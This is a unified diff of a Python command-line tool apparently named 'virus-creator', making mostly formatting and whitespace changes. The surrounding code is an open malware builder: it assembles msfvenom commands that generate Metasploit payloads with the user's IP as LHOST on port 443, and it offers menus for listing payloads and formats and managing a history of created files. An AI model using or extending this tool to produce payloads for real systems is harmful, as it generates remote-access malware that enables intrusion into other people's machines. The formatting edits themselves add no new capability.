@@ -366,9 +366,9 @@ def showInput():
             print("Your current working directory is: " + os.getcwd())
         elif platformPayload == "clear-history":
             if os.path.exists(historyFile):
-                open(historyFile,"w").write("")
+                open(historyFile, "w").write("")
             else:
-                cprint("You don't have any histories currently..","green")
+                cprint("You don't have any histories currently..", "green")
         elif platformPayload == "r-rvc":
             cprint("Executing virus-creator again...", "green")
             os.system("virus-creator.exe")
@@ -469,37 +469,37 @@ def showInput():
                     formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                 print(formatList)
         elif platformPayload == "export-histories" or platformPayload == "eth":
-             nametogether = ""
-             if os.path.exists(historyFile):
-                 historyData = open(historyFile).read()
-                 cprint("How you need to export the histories?","green")
-                 cprint("""
+            nametogether = ""
+            if os.path.exists(historyFile):
+                historyData = open(historyFile).read()
+                cprint("How you need to export the histories?", "green")
+                cprint("""
                    1) I want to move to existing directory or folder
                    2) I want to create a folder and move it
                  """)
-                 conf = input("number>> ")
-                 if conf == "2":
-                     path = input("path to create the folder>>")
-                     nameOfFolder = input("Name of the folder>>")
-                     nametogether = os.path.join(path,nameOfFolder)
-                     runps(f"mkdir {nametogether}")
-                     open(f"{nametogether}/MyVirusHistory.txt","w").write(historyData)
-                 elif conf == "1":
-                     cprint("You can keep the file already created or not created....","green")
-                     path = input("path to write your histories file>>")
-                     open(f"{path}/MyVirusHistory.txt", "w").write(historyData)
-             else:
-                 cprint("Oops, you have no history...",
-                        "green")
+                conf = input("number>> ")
+                if conf == "2":
+                    path = input("path to create the folder>>")
+                    nameOfFolder = input("Name of the folder>>")
+                    nametogether = os.path.join(path, nameOfFolder)
+                    runps(f"mkdir {nametogether}")
+                    open(f"{nametogether}/MyVirusHistory.txt", "w").write(historyData)
+                elif conf == "1":
+                    cprint("You can keep the file already created or not created....", "green")
+                    path = input("path to write your histories file>>")
+                    open(f"{path}/MyVirusHistory.txt", "w").write(historyData)
+            else:
+                cprint("Oops, you have no history...",
+                       "green")
         elif platformPayload == "clear-history":
             if os.path.exists(historyFile):
-                open(historyFile,"w").write("")
-                cprint("Successfully cleared all histories...","green")
+                open(historyFile, "w").write("")
+                cprint("Successfully cleared all histories...", "green")
             else:
-                cprint("You don't have any histories currently...","green")
+                cprint("You don't have any histories currently...", "green")
         elif platformPayload == "show-history":
             if os.path.exists(historyFile):
-                cprint("Showing histories...","green")
+                cprint("Showing histories...", "green")
                 his = open(historyFile).read()
                 print(his)
             else:
@@ -523,7 +523,8 @@ def showInput():
               show-history                   shows your histories
               enter-ps1                      to enter ps1 (powershell) command line where you can type ps1 commands  
               remove-virus-creator or rvc    deletes files created by virus creator
-              clear-history                  clears your history containing when you created path name etc YOU WILL LOSE YOUR HISTORY ONLY IF YOU DIDN'T EXPORT THEM OR DELETED THE EXPORTED ONE
+              clear-history                  clears your history containing when you created path name etc YOU WILL LOSE YOUR HISTORY ONLY IF YOU 
+                                             DIDN'T EXPORT THEM OR DELETED THE EXPORTED ONE
               clear-data                     deletes all data files     
               rvc-ldfs                       deletes files created by virus creator but leaves data files like desktop shortcut etc  
               lsp                            list all available payloads
@@ -564,7 +565,7 @@ def showInput():
             payloadF = open(payloadFile, "w").write(payl)
             payloadList = open(payloadFile).read()
         if platformPayload in payloadList:
-            if platformPayload != "swd" and platformPayload!="clear-history" and platformPayload != "enter-cmd" and platformPayload != "enter-ps1" and platformPayload != "help" and platformPayload != "remove-virus-creator" and platformPayload != "clear-data" and platformPayload != "lsp" and platformPayload != "lsf" and platformPayload != "show-ip" and platformPayload != "" and platformPayload != " " and "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z".lower() not in platformPayload and len(
+            if platformPayload != "swd" and platformPayload != "clear-history" and platformPayload != "enter-cmd" and platformPayload != "enter-ps1" and platformPayload != "help" and platformPayload != "remove-virus-creator" and platformPayload != "clear-data" and platformPayload != "lsp" and platformPayload != "lsf" and platformPayload != "show-ip" and platformPayload != "" and platformPayload != " " and "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z".lower() not in platformPayload and len(
                     platformPayload.strip()) != 0:
                 cprint("Type my-ip to automatically check your ip address and submit the ip address", "green",
                        None,
@@ -590,7 +591,7 @@ def showInput():
                                 f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={ipaddressU} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                             mainPath = os.path.join(pathData, "metasploit-framework/bin")
                             mixPath = os.path.join(mainPath, name)
-                            makedirandmovefile(mixPath, platformPayload, formatPayload,name)
+                            makedirandmovefile(mixPath, platformPayload, formatPayload, name)
                         else:
                             cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
                             while formatPayload not in formatList:
@@ -611,7 +612,7 @@ def showInput():
                                         f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={name} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                                     mainPath = os.path.join(pathData, "metasploit-framework/bin")
                                     mixPath = os.path.join(mainPath, name)
-                                    makedirandmovefile(mixPath, platformPayload, formatPayload,name)
+                                    makedirandmovefile(mixPath, platformPayload, formatPayload, name)
                                 else:
                                     cprint("Invalid format please type lsf to list all formats", "red", None,
                                            attrs=["bold"])
@@ -637,7 +638,7 @@ def showInput():
                             f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={socket.gethostbyname(socket.gethostname())} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                         mainPath = os.path.join(pathData, "metasploit-framework/bin")
                         mixPath = os.path.join(mainPath, name)
-                        makedirandmovefile(mixPath, platformPayload, formatPayload,name)
+                        makedirandmovefile(mixPath, platformPayload, formatPayload, name)
                     else:
                         if formatPayload == "lsf":
                             print(formatList)
@@ -661,12 +662,12 @@ def showInput():
                                     f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={socket.gethostbyname(socket.gethostname())} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                                 mainPath = os.path.join(pathData, "metasploit-framework/bin")
                                 mixPath = os.path.join(mainPath, name)
-                                makedirandmovefile(mixPath, platformPayload, formatPayload,name)
+                                makedirandmovefile(mixPath, platformPayload, formatPayload, name)
                             else:
                                 cprint("Invalid format please type lsf to list all formats", "red", None,
                                        attrs=["bold"])
         else:
-            if platformPayload != "swd" and platformPayload!="eth" and platformPayload!="show-history" and platformPayload!="clear-history" and platformPayload!="eth" and platformPayload!="export-the-histories" and platformPayload != "r-cvc" and platformPayload != "risl-vc" and platformPayload != "r-rvc" and platformPayload != "ec" and platformPayload != "ecd" and platformPayload != "enter-cmd" and platformPayload != "rvc" and platformPayload != "enter-ps1" and platformPayload != "help" and platformPayload != "remove-virus-creator" and platformPayload != "clear-data" and platformPayload != "lsp" and platformPayload != "lsf" and platformPayload != "show-ip" and platformPayload != "r-rvc" and platformPayload != "sip":
+            if platformPayload != "swd" and platformPayload != "eth" and platformPayload != "show-history" and platformPayload != "clear-history" and platformPayload != "eth" and platformPayload != "export-the-histories" and platformPayload != "r-cvc" and platformPayload != "risl-vc" and platformPayload != "r-rvc" and platformPayload != "ec" and platformPayload != "ecd" and platformPayload != "enter-cmd" and platformPayload != "rvc" and platformPayload != "enter-ps1" and platformPayload != "help" and platformPayload != "remove-virus-creator" and platformPayload != "clear-data" and platformPayload != "lsp" and platformPayload != "lsf" and platformPayload != "show-ip" and platformPayload != "r-rvc" and platformPayload != "sip":
                 cprint("Unknown command or payload please type lsp to list all payloads", "red", None, attrs=["bold"])
 
 
